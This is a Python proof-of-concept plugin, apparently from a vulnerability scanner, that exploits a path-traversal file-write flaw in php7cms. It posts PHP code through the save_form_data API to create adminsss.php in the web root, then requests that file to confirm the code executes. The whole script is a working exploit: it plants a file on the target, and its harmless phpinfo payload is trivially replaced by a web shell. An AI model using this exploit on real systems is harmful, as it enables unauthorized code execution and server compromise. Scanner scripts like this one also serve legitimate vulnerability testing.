#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./php7cms/', './']):
                    postData = {
                        'data': '<?php phpinfo()?>'
                    }
                    url1 = path + 'index.php?s=api&c=api&m=save_form_data&name=/../../../adminsss.php"'
                    try:
                        async with session.post(url=url1, data=postData) as res1:
                            if res1:
                                url2 = path + 'adminsss.php'
                                async with session.get(url=url2) as res2:
                                    if res2:
                                        text = await res2.text()
                                        if "php.ini" in text:
                                            yield url1
                    except:
                        pass